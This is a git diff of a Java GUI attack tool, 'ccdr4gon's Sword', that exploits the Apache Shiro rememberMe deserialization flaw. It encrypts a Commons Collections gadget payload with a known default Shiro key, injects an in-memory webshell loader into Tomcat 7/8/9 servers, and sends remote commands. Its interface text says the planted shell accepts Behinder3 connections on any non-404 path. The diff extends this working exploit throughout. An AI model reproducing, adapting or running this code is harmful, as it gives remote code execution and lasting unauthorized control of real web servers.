@@ -1,7 +1,6 @@
 package ccdr4gon;
 
-
-
+import ccdr4gon.utils.AesUtils;
 import ccdr4gon.utils.HttpUtil;
 import javafx.collections.FXCollections;
 import javafx.event.ActionEvent;
@@ -13,12 +12,9 @@ import org.apache.shiro.crypto.AesCipherService;
 import javafx.fxml.Initializable;
 import org.apache.shiro.util.ByteSource;
 
-
-
 import java.net.URL;
 import java.util.Base64;
 import java.util.ResourceBundle;
-
 
 public class Controller implements Initializable {
 
@@ -40,91 +36,129 @@ public class Controller implements Initializable {
     public TextField ShiroKeyField;
     @FXML
     public CheckBox ShiroGBK;
+    @FXML
+    public CheckBox ShiroAlgorithm;
 
 
     public void ShiroExecuteHandler(ActionEvent event){
-            String url=ShiroURLField.getText();
-            String excuteurl;
-            String cmd=ShiroCommandField.getText();
-            Boolean gbk=ShiroGBK.isSelected();
-            if(gbk){
-                excuteurl=url+"&stage=echo&gbk=true&cmd="+cmd;
-            }else {
-                excuteurl=url+"&stage=echo&gbk=false&cmd="+cmd;
-            }
-            if (!excuteurl.contains("?"))
+        String url=ShiroURLField.getText();
+        String excuteurl;
+        String cmd=ShiroCommandField.getText();
+        Boolean gbk=ShiroGBK.isSelected();
+        if(gbk){
+            excuteurl=url+"&stage=echo&gbk=true&cmd="+cmd;
+        }else {
+            excuteurl=url+"&stage=echo&gbk=false&cmd="+cmd;
+        }
+        if (!excuteurl.contains("?"))
             excuteurl=excuteurl.replaceFirst("&","?");
-            try {
-                byte[] res_bytes=HttpUtil.get(excuteurl,"");
-                String res;
-                if(gbk){
+        try {
+            byte[] res_bytes=HttpUtil.get(excuteurl,"");
+            String res;
+            if(gbk){
                 res=new String(res_bytes,"GBK");
-                }
-                else {
-                    res=new String(res_bytes);
-                }
-                res=StringUtils.substringBefore(res,"=========end=========");
-                ShiroTextArea.appendText(res);
-            }catch (Exception e){
-                e.printStackTrace();
             }
+            else {
+                res=new String(res_bytes);
+            }
+            res=StringUtils.substringBefore(res,"=========end=========");
+            ShiroTextArea.appendText(res);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
     }
 
     public void ShiroInjectHandler(ActionEvent event) {
-        try {
-            //get input
-            byte[] key =java.util.Base64.getDecoder().decode(ShiroKeyField.getText());
-            String url=ShiroURLField.getText();
-            //generate payload
-            byte[] init= new CommonsCollectionsK1_1().getPayload();
-            AesCipherService aes = new AesCipherService();
-            ByteSource ciphertext = aes.encrypt(init, key);
-            String initPayload="rememberMe="+ciphertext.toString();
-
-            byte[] load= new ByteBuddy()
-                    .redefine(Load.class)
-                    .name("Load")
-                    .make()
-                    .getBytes();
-            String loadPayload= Base64.getEncoder().encodeToString(load);
-
-            //inject
-            String loadurl;
-            HttpUtil.get(url,initPayload);
-
-            if(url.contains("?")){
-                loadurl=url+"&stage=init";
-            }else {
-                loadurl=url+"?stage=init";
+        if(ShiroMiddlewareBox.getValue().equals("Tomcat8/9")){
+            try {
+                String initPayload;
+                //get input
+                byte[] key =java.util.Base64.getDecoder().decode(ShiroKeyField.getText());
+                String url=ShiroURLField.getText();
+                //generate payload
+                if(ShiroAlgorithm.isSelected()){
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(Init.class);
+                    AesCipherService aes = new AesCipherService();
+                    ByteSource initciphertext = aes.encrypt(init, key);
+                    initPayload = "rememberMe=" + initciphertext;
+                }
+                else {
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(Init.class);
+                    byte[] initciphertext = AesUtils.encrypt(init, key);
+                    initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext);
+                }
+                byte[] load= new ByteBuddy()
+                        .redefine(Load.class)
+                        .name("Load")
+                        .make()
+                        .getBytes();
+                String loadPayload= Base64.getEncoder().encodeToString(load);
+                //inject
+                String loadurl;
+                HttpUtil.get(url,initPayload);
+                if(url.contains("?")){
+                    loadurl=url+"&stage=init";
+                }else {
+                    loadurl=url+"?stage=init";
+                }
+                HttpUtil.post(loadurl,"",loadPayload);
+                ShiroTextArea.appendText("注入完成\n");
+            }catch (Exception e){
+                e.printStackTrace();
             }
-            HttpUtil.post(loadurl,"",loadPayload);
-            ShiroTextArea.appendText("注入完成\n");
-        }catch (Exception e){
-            e.printStackTrace();
+        }
+        else if(ShiroMiddlewareBox.getValue().equals("Tomcat7")){
+
+            try {
+                //get input
+                byte[] key =java.util.Base64.getDecoder().decode(ShiroKeyField.getText());
+                String url=ShiroURLField.getText();
+                //generate payload
+                String initPayload;
+                if(ShiroAlgorithm.isSelected()){
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(T7.class);
+                    AesCipherService aes = new AesCipherService();
+                    ByteSource initciphertext = aes.encrypt(init, key);
+                    initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext.getBytes());
+                }
+                else {
+                    byte[] init = new CommonsCollectionsK1_1().getPayload(Init.class);
+                    byte[] initciphertext = AesUtils.encrypt(init, key);
+                    initPayload = "rememberMe=" + Base64.getEncoder().encodeToString(initciphertext);
+                }
+
+
+                byte[] load= new ByteBuddy()
+                        .redefine(T7Load.class)
+                        .name("ccdr4gon.T7Load")
+                        .make()
+                        .getBytes();
+                String loadPayload= Base64.getEncoder().encodeToString(load);
+                //inject
+                HttpUtil.get(url,initPayload);
+                HttpUtil.post(url,"",loadPayload);
+                ShiroTextArea.appendText("注入完成\n");
+            }catch (Exception e){
+                e.printStackTrace();
+            }
         }
     }
     @Override
     public void initialize (URL url, ResourceBundle rb)
     {
         ShiroWebShellManagerBox.setItems(FXCollections.observableArrayList("Behinder3"));
-        ShiroMiddlewareBox.setItems(FXCollections.observableArrayList("Tomcat"));
-
+        ShiroMiddlewareBox.setItems(FXCollections.observableArrayList("Tomcat8/9","Tomcat7"));
         //default value
         ShiroKeyField.appendText("kPH+bIxk5D2deZiIxcaaaA==");
         ShiroWebShellManagerBox.setValue("Behinder3");
-        ShiroMiddlewareBox.setValue("Tomcat");
+        ShiroMiddlewareBox.setValue("Tomcat8/9");
 
         //绑定事件
         ShiroInjectButton.setOnAction(this::ShiroInjectHandler);
         ShiroExecuteButton.setOnAction(this::ShiroExecuteHandler);
 
-        ShiroTextArea.appendText("ccdr4gon's Sword 0.0.1 --- 百废待兴的简陋版本\n");
+        ShiroTextArea.appendText("ccdr4gon's Sword 0.0.2 --- 能用就行的简陋版本\n");
         ShiroTextArea.appendText("Tomcat包括SpringBoot的嵌入式Tomcat(默认Web容器),直接使用即可\n");
         ShiroTextArea.appendText("使用方法:先点击Inject注入，然后可以执行命令，并且此Tomcat解析的任何非404路径都可以连接冰蝎3\n");
     }
-
-
-
-
-
 }
